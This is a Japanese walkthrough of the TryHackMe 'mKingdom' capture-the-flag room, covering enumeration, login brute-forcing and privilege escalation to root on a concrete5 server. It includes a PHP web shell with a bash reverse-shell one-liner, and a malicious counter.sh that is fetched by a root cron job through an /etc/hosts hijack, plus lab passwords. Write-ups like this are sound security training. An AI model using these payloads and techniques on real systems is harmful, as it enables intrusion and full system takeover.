# mKingdom CTF

https://tryhackme.com/room/mkingdom

マリオがモチーフらしい。

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.175.218
root@ip-10-10-122-2:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-05 06:04 GMT
Nmap scan report for 10.10.175.218
Host is up (0.027s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
85/tcp open  mit-ml-dev
MAC Address: 02:64:8E:04:19:33 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 11.04 seconds
root@ip-10-10-122-2:~# sudo nmap -sV -p85 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-05 06:04 GMT
Nmap scan report for 10.10.175.218
Host is up (0.00010s latency).

PORT   STATE SERVICE VERSION
85/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
MAC Address: 02:64:8E:04:19:33 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.04 seconds
```

85 に HTTP

### gobuster

```shell
root@ip-10-10-122-2:~# gobuster dir -x=txt,php -u http://$TARGET:85 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.175.218:85
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 284]
/app                  (Status: 301) [Size: 314] [--> http://10.10.175.218:85/app/]
/server-status        (Status: 403) [Size: 293]
Progress: 654825 / 654828 (100.00%)
===============================================================
Finished
===============================================================

root@ip-10-10-122-2:~# gobuster dir -x=txt,php -u http://$TARGET:85/app/castle -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.175.218:85/app/castle
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 295]
/updates              (Status: 301) [Size: 329] [--> http://10.10.175.218:85/app/castle/updates/]
/packages             (Status: 301) [Size: 330] [--> http://10.10.175.218:85/app/castle/packages/]
/application          (Status: 301) [Size: 333] [--> http://10.10.175.218:85/app/castle/application/]
/robots.txt           (Status: 200) [Size: 532]
Progress: 8022 / 654828 (1.23%)[ERROR] Get "http://10.10.175.218:85/app/castle/index.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/concrete             (Status: 301) [Size: 330] [--> http://10.10.175.218:85/app/castle/concrete/]
Progress: 654825 / 654828 (100.00%)
===============================================================
Finished
===============================================================
```

http://10.10.175.218:85/app/

```html
<body>
  <button onclick="buttonClick()">JUMP</button>

  <script>
    function buttonClick() {
      alert("Make yourself confortable and enjoy my place.");
      window.location.href = "castle";
    }
  </script>
</body>
```

http://10.10.175.218:85/app/castle/

robots.txt

```text
User-agent: *
Disallow: /application/attributes
Disallow: /application/authentication
Disallow: /application/bootstrap
Disallow: /application/config
Disallow: /application/controllers
Disallow: /application/elements
Disallow: /application/helpers
Disallow: /application/jobs
Disallow: /application/languages
Disallow: /application/mail
Disallow: /application/models
Disallow: /application/page_types
Disallow: /application/single_pages
Disallow: /application/tools
Disallow: /application/views
Disallow: /ccm/system/captcha/picture
```

http://10.10.175.218:85/app/castle/index.php/login

```html
<meta name="generator" content="concrete5 - 8.5.2" />
```

このバージョンは CVE-2020-24986 の脆弱性があるが、先にログインが必要。

```shell
$ searchsploit concrete
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Concrete 5.4.1 1 - 'rcID' Cross-Site Scripting                                    | php/webapps/36076.txt
Concrete CMS 5.4.1.1 - Cross-Site Scripting / Remote Code Execution               | php/webapps/15915.py
Concrete CMS < 5.5.21 - Multiple Vulnerabilities                                  | php/webapps/37225.pl
Concrete5 8.5.4 - 'name' Stored XSS                                               | php/webapps/49721.txt
Concrete5 CME v9.1.3 - Xpath injection                                            | php/webapps/51144.txt
Concrete5 CMS 5.5.2.1 - Information Disclosure / SQL Injection / Cross-Site Scrip | php/webapps/37103.txt
Concrete5 CMS 5.6.1.2 - Multiple Vulnerabilities                                  | php/webapps/26077.txt
Concrete5 CMS 5.6.2.1 - 'index.php?cID' SQL Injection                             | php/webapps/31735.txt
Concrete5 CMS 5.7.3.1 - 'Application::dispatch' Method Local File Inclusion       | php/webapps/40045.txt
Concrete5 CMS 8.1.0 - 'Host' Header Injection                                     | php/webapps/41885.txt
Concrete5 CMS < 5.4.2.1 - Multiple Vulnerabilities                                | php/webapps/17925.txt
Concrete5 CMS < 8.3.0 - Username / Comments Enumeration                           | php/webapps/44194.py
Concrete5 CMS FlashUploader - Arbitrary '.SWF' File Upload                        | php/webapps/37226.txt
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

デフォルトユーザー名が admin であることから、ログイン画面でユーザー名「admin」固定でパスワードファジング。  
csrftoken 風のトークンが使われているので、自作ツールを作った。  
https://github.com/tacores/ctf-tools

```shell
$ python ./loginfuzz.py
Trying password: 123456
Trying password: password
Success! Password: password
```

admin / password でログインできた。

## CVE-2020-24986

管理者でログインできたので、CVE-2020-24986 を使う。

https://hackerone.com/reports/768322

1. Allowed File Types で php を追加
2. File Manager から、shell.php をアップロード
3. 右クリック、Properties からリンクをクリック

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.2.22.182/6666 0>&1'") ?>
```

リバースシェル取得

```shell
<html/app/castle/application/files/6317/3874/2127$ ls -al /home
total 16
drwxr-xr-x  4 root  root  4096 Jun  9  2023 .
drwxr-xr-x 23 root  root  4096 Jun  7  2023 ..
drwx------ 15 mario mario 4096 Jan 29  2024 mario
drwxrwx--- 16 toad  toad  4096 Jan 29  2024 toad
```

まずは、toad を目指す？

## 権限昇格１

toad オーナーのファイル検索

```shell
www-data@mkingdom:/var/www/html/app/castle/application/files/6317/3874/2127$ find / -user toad -type f 2>/dev/null
<n/files/6317/3874/2127$ find / -user toad -type f 2>/dev/null
/bin/cat

<html/app/castle/application/files/6317/3874/2127$ ls -al /bin/cat
ls -al /bin/cat
-rwsr-xr-x 1 toad root 47904 Mar 10  2016 /bin/cat
```

cat コマンドが toad オーナーで SUID 付きなっている。  
ちなみに、mario オーナーのファイルは 1 つも見えなかった。

```shell
www-data@mkingdom:/var/www/html/app/castle/application/files/6317/3874/2127$ cat /home/toad/user.txt
cat: /home/toad/user.txt: No such file or directory

www-data@mkingdom:/var/www/html/app/castle/application/files/6317/3874/2127$ cat /home/toad/.ssh/id_rsa
cat: /home/toad/.ssh/id_rsa: No such file or directory
```

何を読めばよいのか分からない。

SUID

```shell
www-data@mkingdom:/home$ find / -perm -u=s -type f -ls 2>/dev/null
find / -perm -u=s -type f -ls 2>/dev/null
1310743   48 -rwsr-xr-x   1 toad     root        47904 Mar 10  2016 /bin/cat
1310887   68 -rwsr-xr-x   1 root     root        69120 Nov 23  2016 /bin/umount
1310775   32 -rwsr-xr-x   1 root     root        30800 May 15  2015 /bin/fusermount
1310877   40 -rwsr-xr-x   1 root     root        36936 May 16  2017 /bin/su
1310810   96 -rwsr-xr-x   1 root     root        94792 Nov 23  2016 /bin/mount
1310849   44 -rwsr-xr-x   1 root     root        44680 May  7  2014 /bin/ping6
1310848   44 -rwsr-xr-x   1 root     root        44168 May  7  2014 /bin/ping
9708677   20 -rwsr-sr-x   1 libuuid  libuuid     18904 Nov 23  2016 /usr/sbin/uuidd
9708601  340 -rwsr-xr--   1 root     dip        347296 Jun 12  2018 /usr/sbin/pppd
9699481   44 -rwsr-xr-x   1 root     root        41336 May 16  2017 /usr/bin/chsh
9700003   16 -rwsr-xr-x   1 root     lpadmin     14336 Nov 19  2018 /usr/bin/lppasswd
9700555   24 -rwsr-xr-x   1 root     root        23104 May  7  2014 /usr/bin/traceroute6.iputils
9699747   72 -rwsr-xr-x   1 root     root        72280 May 16  2017 /usr/bin/gpasswd
9699478   48 -rwsr-xr-x   1 root     root        46424 May 16  2017 /usr/bin/chfn
9700114   76 -rwsr-xr-x   1 root     root        75256 Oct 21  2013 /usr/bin/mtr
9700184   48 -rwsr-xr-x   1 root     root        47032 May 16  2017 /usr/bin/passwd
9700132   36 -rwsr-xr-x   1 root     root        36592 May 16  2017 /usr/bin/newgrp
9700503  152 -rwsr-xr-x   1 root     root       155008 May 29  2017 /usr/bin/sudo
9703364   12 -rwsr-xr-x   1 root     root        10240 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
10094176   20 -rwsr-xr-x   1 root     root        18664 Mar 18  2017 /usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
9703063  304 -rwsr-xr--   1 root     messagebus   310800 Dec  7  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
9699560   16 -rwsr-xr-x   1 root     root        14808 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
9706382  432 -rwsr-xr-x   1 root     root       440416 Mar  4  2019 /usr/lib/openssh/ssh-keysign
```

database.php

```shell
www-data@mkingdom:/home$ cat /var/www/html/app/castle/application/config/database.php
e.phpvar/www/html/app/castle/application/config/databas
<?php

return [
    'default-connection' => 'concrete',
    'connections' => [
        'concrete' => [
            'driver' => 'c5_pdo_mysql',
            'server' => 'localhost',
            'database' => 'mKingdom',
            'username' => 'toad',
            'password' => 'toadisthebest',
            'character_set' => 'utf8',
            'collation' => 'utf8_unicode_ci',
        ],
    ],
];
```

toad ユーザーの MySQL のパスワードが書かれている。同じとは限らないが、su を試す。

```shell
www-data@mkingdom:/home$ su toad
su toad
su: must be run from a terminal
```

そのままでは su を使えない。

```shell
www-data@mkingdom:/home$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@mkingdom:/home$ export TERM=xterm
export TERM=xterm
www-data@mkingdom:/home$ su toad
su toad
Password:

toad@mkingdom:/home$
```

toad に昇格できた。

```shell
toad@mkingdom:~$ ls -al
ls -al
total 100
drwxrwx--- 16 toad toad 4096 Jan 29  2024 .
drwxr-xr-x  4 root root 4096 Jun  9  2023 ..
lrwxrwxrwx  1 root root    9 Nov 27  2023 .bash_history -> /dev/null
-rw-r--r--  1 toad toad  220 Jun  8  2023 .bash_logout
-rw-r--r--  1 toad toad 3693 Nov 25  2023 .bashrc
drwx------ 11 toad toad 4096 Nov 28  2023 .cache
drwx------  3 toad toad 4096 Nov 26  2023 .compiz
drwx------ 14 toad toad 4096 Nov 26  2023 .config
drwxr-xr-x  2 toad toad 4096 Nov 26  2023 Desktop
drwxr-xr-x  2 toad toad 4096 Nov 26  2023 Documents
drwxr-xr-x  2 toad toad 4096 Nov 26  2023 Downloads
drwx------  3 toad toad 4096 Dec 10  2023 .gconf
-rw-------  1 toad toad 1710 Dec 10  2023 .ICEauthority
drwx------  3 toad toad 4096 Nov 26  2023 .local
drwxr-xr-x  2 toad toad 4096 Nov 26  2023 Music
-rw-rw-r--  1 toad toad  637 Jan 29  2024 .mysql_history
drwxr-xr-x  2 toad toad 4096 Nov 26  2023 Pictures
-rw-r--r--  1 toad toad  675 Jun  8  2023 .profile
drwxr-xr-x  2 toad toad 4096 Nov 26  2023 Public
-rw-r--r--  1 toad toad  914 Nov 25  2023 smb.txt
drwxrwx---  2 toad toad 4096 Nov 27  2023 .ssh
drwxr-xr-x  2 toad toad 4096 Nov 26  2023 Templates
drwxr-xr-x  2 toad toad 4096 Nov 26  2023 Videos
-rw-------  1 toad toad   57 Dec 10  2023 .Xauthority
-rw-------  1 toad toad 1676 Dec 10  2023 .xsession-errors
-rw-------  1 toad toad 1675 Nov 30  2023 .xsession-errors.old
```

```shell
toad@mkingdom:~$ cat smb.txt
cat smb.txt

Save them all Mario!

                                      \| /
                    ....'''.           |/
             .''''''        '.       \ |
             '.     ..     ..''''.    \| /
              '...''  '..''     .'     |/
     .sSSs.             '..   ..'    \ |
    .P'  `Y.               '''        \| /
    SS    SS                           |/
    SS    SS                           |
    SS  .sSSs.                       .===.
    SS .P'  `Y.                      | ? |
    SS SS    SS                      `==='
    SS ""    SS
    P.sSSs.  SS
    .P'  `Y. SS
    SS    SS SS                 .===..===..===..===.
    SS    SS SS                 |   || ? ||   ||   |
    ""    SS SS            .===.`==='`==='`==='`==='
  .sSSs.  SS SS            |   |
 .P'  `Y. SS SS       .===.`==='
 SS    SS SS SS       |   |
 SS    SS SS SS       `==='
SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
```

ゴミしかない。

環境変数

```shell
PWD_token=aWthVGVOVEFOdEVTCg==
```

```shell
$ echo aWthVGVOVEFOdEVTCg== | base64 -d
ikaTeNTANtES
```

mario のパスワードだった。

```shell
mario@mkingdom:~$ ls -al
ls -al
total 96
drwx------ 15 mario mario 4096 Jan 29  2024 .
drwxr-xr-x  4 root  root  4096 Jun  9  2023 ..
lrwxrwxrwx  1 mario mario    9 Jun  9  2023 .bash_history -> /dev/null
-rw-r--r--  1 mario mario  220 Jun  7  2023 .bash_logout
-rw-r--r--  1 mario mario 3637 Jun  7  2023 .bashrc
drwx------ 11 mario mario 4096 Jan 26  2024 .cache
drwx------  3 mario mario 4096 Jan 29  2024 .compiz
drwx------ 14 mario mario 4096 Jan 26  2024 .config
drwxr-xr-x  2 mario mario 4096 Jan 26  2024 Desktop
-rw-r--r--  1 mario mario   25 Jan 26  2024 .dmrc
drwxr-xr-x  2 mario mario 4096 Jan 26  2024 Documents
drwxr-xr-x  2 mario mario 4096 Jan 26  2024 Downloads
drwx------  3 mario mario 4096 Jan 29  2024 .gconf
-rw-------  1 mario mario 1026 Jan 29  2024 .ICEauthority
drwx------  3 mario mario 4096 Jan 26  2024 .local
drwxr-xr-x  2 mario mario 4096 Jan 26  2024 Music
drwxr-xr-x  2 mario mario 4096 Jan 26  2024 Pictures
-rw-r--r--  1 mario mario  675 Jun  7  2023 .profile
drwxr-xr-x  2 mario mario 4096 Jan 26  2024 Public
drwxr-xr-x  2 mario mario 4096 Jan 26  2024 Templates
-rw-r--r--  1 root  root    38 Nov 27  2023 user.txt
drwxr-xr-x  2 mario mario 4096 Jan 26  2024 Videos
-rw-------  1 mario mario   57 Jan 29  2024 .Xauthority
-rw-------  1 mario mario 1581 Jan 29  2024 .xsession-errors
-rw-------  1 mario mario  805 Jan 26  2024 .xsession-errors.old

mario@mkingdom:~$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
```

cat のせいで開けない。  
権限昇格のための SUID ではなく、嫌がらせのためだったのか・・・

```shell
mario@mkingdom:~$ perl -ne 'print' user.txt
thm{030a.....}
```

ようやくフラグ 1 ゲット。

## 権限昇格２

```shell
mario@mkingdom:~$ sudo -l
sudo -l
[sudo] password for mario: ikaTeNTANtES

Matching Defaults entries for mario on mkingdom:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    pwfeedback

User mario may run the following commands on mkingdom:
    (ALL) /usr/bin/id
```

id は使えないと思う。バイナリを改変されてない限り。

### pspy

https://github.com/DominicBreuker/pspy

pspy64 を実行すると、root ユーザーが下記のプロセスを定期的に繰り返していることが分かる。

```shell
2025/02/05 04:31:01 CMD: UID=0     PID=12165  | curl mkingdom.thm:85/app/castle/application/counter.sh
2025/02/05 04:31:01 CMD: UID=0     PID=12164  | /bin/sh -c curl mkingdom.thm:85/app/castle/application/counter.sh | bash >> /var/log/up.log
```

```shell
mario@mkingdom:~$ ls -al /var/www/html/app/castle/application/counter.sh
ls -al /var/www/html/app/castle/application/counter.sh
-rw-r--r-- 1 root root 129 Nov 29  2023 /var/www/html/app/castle/application/counter.sh

mario@mkingdom:~$ cat /var/www/html/app/castle/application/counter.sh
cat /var/www/html/app/castle/application/counter.sh
#!/bin/bash
echo "There are $(ls -laR /var/www/html/app/castle/ | wc -l) folder and files in TheCastleApp in - - - - > $(date)."
```

シェル自体の書き込みはできない。

```shell
mario@mkingdom:~$ ls -al /etc/hosts
ls -al /etc/hosts
-rw-rw-r-- 1 root mario 342 Jan 26  2024 /etc/hosts

mario@mkingdom:~$ cat /etc/hosts
cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       mkingdom.thm
127.0.0.1       backgroundimages.concrete5.org
127.0.0.1       www.concrete5.org
127.0.0.1       newsflow.concrete5.org

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

hosts は書き込みできる設定になっている。

つまり、自分の HTTP サーバー 85 番ポートで、  
/app/castle/application/counter.sh  
をホストすれば、root がそれを実行する。

ホストする counter.sh

```shell
#!/bin/bash
bash -i >& /dev/tcp/10.2.22.182/8889 0>&1
```

/etc/hosts

```shell
mario@mkingdom:~$ echo "10.2.22.182    mkingdom.thm" > /etc/hosts
```

リバースシェル

```shell
$ nc -lvnp 8889
listening on [any] 8889 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.175.218] 42536
bash: cannot set terminal process group (12446): Inappropriate ioctl for device
bash: no job control in this shell
root@mkingdom:~# ls -al
ls -al
total 36
drwx------  3 root root 4096 Nov 29  2023 .
drwxr-xr-x 23 root root 4096 Jun  7  2023 ..
lrwxrwxrwx  1 root root    9 Nov 27  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Feb 19  2014 .bashrc
-rw-r--r--  1 root root  131 Nov 28  2023 counter.sh
-rw-------  1 root root  637 Nov 29  2023 .mysql_history
drwxr-xr-x  2 root root 4096 Nov 26  2023 .pip
-rw-r--r--  1 root root  140 Feb 19  2014 .profile
-rw-r--r--  1 root root   38 Nov 27  2023 root.txt
-rw-r--r--  1 root root   66 Nov 25  2023 .selected_editor
root@mkingdom:~# perl -ne 'print' root.txt
perl -ne 'print' root.txt
thm{e8b2f.....}
```

ルートフラグゲット

## 振り返り

- HTTP レスポンスがやけに遅い場合があったり、SSH が塞がれていたり、cat に細工されてたりが原因で、達成感より疲労感が勝った。「toad ユーザーは要らなかった」とほぼ全員が思ったことだろう。
- ログイン画面に csrf 風トークンが使われていた。こういう場合、hydra は使えないし、intruder は遅すぎるので、この機会に前から作りたいと思っていたツールを作った。それが一番の収穫。
- pspy を知れたのも大きかった。
